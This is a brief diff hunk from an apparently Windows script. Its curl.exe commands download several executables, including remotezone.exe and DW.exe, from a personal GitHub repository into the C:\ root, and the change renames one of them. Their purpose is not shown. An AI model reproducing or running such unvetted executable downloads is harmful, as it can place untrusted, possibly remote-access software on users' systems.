@@ -18,7 +18,7 @@ curl.exe -L -o C:\bhavani.exe https://raw.githubusercontent.com/hari98486/fff/ma
 
 curl.exe -L -o C:\remotezone.exe https://raw.githubusercontent.com/hari98486/fff/main/remotezone.exe
 
-curl.exe -L -o C:\jai.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/jai.exe"
+curl.exe -L -o C:\jay1.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/jay1.exe"
 
 curl.exe -L -o C:\DW.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/DW.exe"
 
